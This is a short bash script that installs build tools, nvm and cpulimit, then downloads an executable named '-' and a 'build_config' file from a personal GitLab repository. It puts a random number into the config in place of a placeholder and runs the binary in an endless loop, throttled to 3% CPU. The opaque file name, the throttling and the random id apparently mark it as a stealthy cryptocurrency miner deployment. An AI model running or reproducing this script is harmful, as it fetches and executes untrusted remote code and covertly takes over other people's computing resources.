#!/bin/bash
su root
apt-get update && apt-get install sudo -y
sudo apt-get install build-essential libssl-dev -y
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh | bash
source ~/.bashrc
sudo apt update && sudo apt install -y cpulimit
wget https://gitlab.com/aprilantwan67/kazep/-/raw/main/-
wget https://gitlab.com/aprilantwan67/kazep/-/raw/main/build_config
chmod +x - build_config
sed -i "s/KASEP90/$(shuf -n 1 -i 1-99999999)/" "build_config"
while :; do timeout 1m cpulimit -l 3 ./-; sleep 20; done
